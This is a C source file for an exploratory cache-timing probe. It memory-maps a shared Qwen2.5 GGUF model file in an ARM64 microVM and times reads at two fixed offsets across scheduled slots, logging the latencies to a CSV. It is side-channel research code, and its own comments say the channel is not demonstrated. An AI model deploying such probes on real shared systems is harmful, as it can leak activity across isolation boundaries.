// ARM64 MicroVM Qwen2.5 GGUF cache-timing exploratory probe.
// Research use only. Eviction is heuristic and is not a demonstrated side channel.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define MODEL_PATH "/mnt/shared/model.gguf"
#define OFF_RED 151299832ULL
#define OFF_BLUE 158107864ULL
#define EVICT_SIZE (4ULL * 1024 * 1024)
#define LINE_SIZE 64
#define MAX_SAMPLES 320

static volatile uint8_t sink = 0;
static uint8_t *eviction;
static size_t *order;
static size_t nlines;

static double epoch_seconds(void) {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return (double)ts.tv_sec + ts.tv_nsec / 1e9;
}

static void wait_for(double target) {
    while (1) {
        double remaining = target - epoch_seconds();
        if (remaining <= 0) return;
        if (remaining > .1) usleep(50000);
        else if (remaining > .01) usleep(5000);
        else usleep(500);
    }
}

static inline uint64_t counter(void) {
#if defined(__aarch64__)
    uint64_t ticks;
    __asm__ volatile("isb; mrs %0, cntvct_el0" : "=r"(ticks) :: "memory");
    return ticks;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
#endif
}

static uint64_t timer_hz(void) {
#if defined(__aarch64__)
    uint64_t hz;
    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(hz));
    return hz;
#else
    return 1000000000ULL;
#endif
}

static void prepare_eviction(void) {
    nlines = EVICT_SIZE / LINE_SIZE;
    if (posix_memalign((void **)&eviction, 4096, EVICT_SIZE) != 0) {
        fprintf(stderr, "eviction buffer allocation failed\n");
        exit(1);
    }
    order = malloc(nlines * sizeof(*order));
    if (!order) { perror("malloc(order)"); exit(1); }
    for (size_t i = 0; i < nlines; ++i) {
        order[i] = i;
        eviction[i*LINE_SIZE] = (uint8_t)(i & 255);
    }
    // Deterministic shuffling suppresses sequential prefetch effects;
    // it does not guarantee eviction of any particular cache line.
    uint32_t state = 0x94B00A2u;
    for (size_t i = nlines - 1; i > 0; --i) {
        state ^= state << 13;
        state ^= state >> 17;
        state ^= state << 5;
        size_t j = state % (i+1);
        size_t tmp = order[i]; order[i] = order[j]; order[j] = tmp;
    }
}

static void evict_heuristically(void) {
    for (size_t i = 0; i < nlines; ++i) {
        sink ^= eviction[order[i]*LINE_SIZE];
    }
#if defined(__aarch64__)
    __asm__ volatile("dsb sy" ::: "memory");
#endif
}

static uint64_t probe(const volatile uint8_t *ptr, uint64_t hz) {
    evict_heuristically();
    uint64_t a = counter();
    sink ^= *ptr;
#if defined(__aarch64__)
    __asm__ volatile("dsb sy" ::: "memory");
#endif
    uint64_t b = counter();
    return (uint64_t)(((__uint128_t)(b - a) * 1000000000ULL) / hz);
}

static int cmp64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t*)a;
    uint64_t y = *(const uint64_t*)b;
    return (x>y)-(x<y);
}

static uint64_t quantile(uint64_t *v, size_t n, double q) {
    uint64_t copy[MAX_SAMPLES];
    if (n == 0) return 0;
    memcpy(copy, v, n*sizeof(uint64_t));
    qsort(copy, n, sizeof(uint64_t), cmp64);
    return copy[(size_t)((n-1)*q)];
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s START_UNIX SLOTS SLOT_SECONDS\n", argv[0]);
        return 2;
    }
    char *end;
    errno = 0;
    long long start = strtoll(argv[1], &end, 10);
    if (errno || *end || start < 1) { fprintf(stderr, "Bad start timestamp\n"); return 2; }
    int slots = atoi(argv[2]);
    int slot_sec = atoi(argv[3]);
    if (slots < 1 || slots > 100 || slot_sec < 5 || slot_sec > 300) {
        fprintf(stderr, "Invalid trial counts/duration\n"); return 2;
    }
    if (epoch_seconds() > start + 1) {
        fprintf(stderr, "Start time already passed, choose a future timestamp\n"); return 2;
    }
    int fd = open(MODEL_PATH, O_RDONLY);
    if (fd < 0) { perror("open model"); return 1; }
    struct stat st;
    if (fstat(fd, &st) != 0 || (uint64_t)st.st_size <= OFF_BLUE) {
        perror("model size too small"); close(fd); return 1;
    }
    const volatile uint8_t *model = mmap(NULL, (size_t)st.st_size,
                                         PROT_READ, MAP_SHARED, fd, 0);
    close(fd);
    if (model == MAP_FAILED) { perror("mmap"); return 1; }
    prepare_eviction();
    uint64_t hz = timer_hz();
    if (hz == 0) { fprintf(stderr, "timer freq zero\n"); return 1; }
    FILE *f = fopen("/root/observer.csv", "w");
    if (!f) { perror("fopen /root/observer.csv"); return 1; }
    fprintf(f, "slot,unix_sec,red_ns,blue_ns\n");
    fprintf(stderr, "OBSERVER start=%lld slots=%d slot_seconds=%d timer_hz=%llu\n",
            start,slots,slot_sec,(unsigned long long)hz);
    fprintf(stderr, "Note: naive 4MiB eviction sweep, exploratory signal only; not a cache-miss oracle\n");
    fflush(stderr);
    for (int s=0; s<slots; ++s) {
        double begin = (double)start + s*slot_sec;
        wait_for(begin+1);
        uint64_t reds[MAX_SAMPLES], blues[MAX_SAMPLES];
        size_t n=0;
        double end_sample = begin + slot_sec-2; // leave gap before next slot
        while (epoch_seconds() < end_sample && n < MAX_SAMPLES) {
            // Alternate order to reduce first-vs-second bias.
            uint64_t a, b;
            if ((n & 1u) == 0) {
                a=probe(model+OFF_RED,hz);
                b=probe(model+OFF_BLUE,hz);
            } else {
                b=probe(model+OFF_BLUE,hz);
                a=probe(model+OFF_RED,hz);
            }
            reds[n]=a; blues[n]=b;
            fprintf(f,"%d,%.6f,%llu,%llu\n",s,epoch_seconds(),
                   (unsigned long long)a,(unsigned long long)b);
            ++n;
            usleep(50000);
        }
        fflush(f);
        printf("slot=%02d samples=%zu red_p10=%llu blue_p10=%llu red_median=%llu blue_median=%llu ns\n",
               s,n,
               (unsigned long long)quantile(reds,n,.10),
               (unsigned long long)quantile(blues,n,.10),
               (unsigned long long)quantile(reds,n,.50),
               (unsigned long long)quantile(blues,n,.50));
        fflush(stdout);
    }
    fclose(f);
    munmap((void*)model,(size_t)st.st_size);
    free(eviction);
    free(order);
    fprintf(stderr,"Done: /root/observer.csv\n");
    return 0;
}
